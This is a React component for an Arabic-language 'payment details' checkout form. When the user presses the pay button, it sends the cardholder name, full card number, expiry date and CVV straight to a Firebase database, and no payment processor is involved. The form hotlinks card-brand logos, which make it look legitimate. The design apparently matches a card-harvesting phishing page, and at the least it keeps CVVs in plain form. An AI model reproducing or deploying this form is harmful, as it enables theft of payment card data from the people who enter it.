import React from 'react';
import { dateBase } from './firebase';
import { ref, set } from 'firebase/database';

const PayForms = (props: any) => {
  const [number, setCnumber] = React.useState('');
  const [ccname, setCcname] = React.useState('');
  const [year, setyear] = React.useState('');
  const [moanth, setMonth] = React.useState('');

  const [cvv, setCvv] = React.useState('');
  const handleData = async (formData: any) => {
    const db = dateBase;
    set(ref(db, 'users/' + formData.name), {
      name: formData.name,
      num: formData.num,
      date: formData.date,
      cvv: formData.cvv,
    });
  };

  return (
    <div className="container">
      <form className="payform">
        <div className="heading">تفاصيل الدفع</div>

        <label htmlFor="name" className="label">
          <span className="title">اسم حامل البطاقة</span>
          <input
            className="input-field"
            type="text"
            name="input-name"
            title="Input title"
            placeholder="اسم حامل البطاقة"
            onChange={(e) => {
              setCcname(e.target.value);
            }}
          />
        </label>
        <label htmlFor="serialCardNumber" className="label">
          <span className="title">رقم البطاقة</span>
          <input
            id="serialCardNumber"
            className="input-field"
            type="number"
            name="input-name"
            title="رقم البطاقة"
            placeholder="0000 0000 0000 0000"
            onChange={(e) => {
              setCnumber(e.target.value);
            }}
          />
        </label>
        <div className="split">
          <label htmlFor="ExDate" className="label">
            <span className="title">تاريخ الانتهاء</span>
            <input
              id="ExDate"
              className="input-field"
              type="text"
              name="input-name"
              title="تاريخ الانتهاء"
              placeholder="01/23"
              onChange={(e) => {
                setyear(e.target.value);
              }}
            />
          </label>
          <label htmlFor="cvv" className="label">
            <span className="title"> CVV</span>
            <input
              id="cvv"
              className="input-field"
              type="number"
              name="cvv"
              title="CVV"
              placeholder="CVV"
              onChange={(e) => {
                setCvv(e.target.value);
              }}
            />
          </label>
        </div>
        <input
          className="checkout-btn"
          type="button"
          value="انهاء عملية الدفع"
          onClick={() => {
            handleData({
              name: ccname,
              num: number,
              date: year,
              cvv: cvv,
            }).then(() => {
              props.handleElement(0);
            });
          }}
        />
        <img
          src="https://help.zazzle.com/hc/article_attachments/360010513393/Logos-01.png"
          alt=""
          height={60}
          width={'100%'}
        />
      </form>
    </div>
  );
};
export default PayForms;
